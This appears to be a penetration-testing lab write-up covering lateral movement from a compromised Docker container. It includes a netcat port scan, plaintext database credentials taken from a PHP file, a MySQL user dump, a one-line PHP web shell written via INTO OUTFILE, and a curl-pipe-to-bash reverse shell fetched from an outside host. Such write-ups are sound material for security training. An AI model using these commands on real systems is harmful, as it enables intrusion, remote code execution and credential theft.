# L-SRV02 Docker Container

We entered this docker container by exploiting RCE in [L-SRV01](../L-SRV01/L-SRV01.md) web server.

## Enumeration

Using netcat to portscan with `nc -zv 127.0.0.1 1-65535` we find that the following ports are open.

```
localhost [127.0.0.1] 3306 (mysql) open
localhost [127.0.0.1] 80 (http) open
```

In the container's default gateway (`192.168.100.1`) we find that the following ports are open.

```
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 8080 (http-alt) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 3306 (mysql) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 80 (http) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 22 (ssh) open
```

Checking the `/var/www/admin/db_connect.php` file, we find credentials.

```
<?php

define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');

$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);

if($connection == false){

        die("Error: Connection to Database could not be made." . mysqli_connect_error());
}
?>
```

Username: `admin`  
Password: `!123SecureAdminDashboard321!`

Using these credentials, we can access the database in `192.168.100.1` using the command `mysql -h 192.168.100.1 -u admin -p`.

We can enumerate databases.
```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| DashboardDB        |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use DashboardDB
Database changed
mysql> show tables;
+-----------------------+
| Tables_in_DashboardDB |
+-----------------------+
| users                 |
+-----------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----------+-----------------+
| username | password        |
+----------+-----------------+
| admin    | DBManagerLogin! |
| gurag    | AAAA            |
+----------+-----------------+
2 rows in set (0.00 sec)
```

Now we have more creds. 

Username: `gurag`  
Password: `AAAA`

We can exploit MySQL database to gain RCE using `select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';`.

Now we have RCE on the host machine. WE can execute commands using `curl 192.168.100.1:8080/shell.php?cmd=COMMAND`.

Now to get a reverse shell.
`curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.104.41%3A:9999%2F/revshell.sh%7Cbash%20%26'`

Now we have RCE on [L-SRV01](../L-SRV01/L-SRV01.md) as www-data.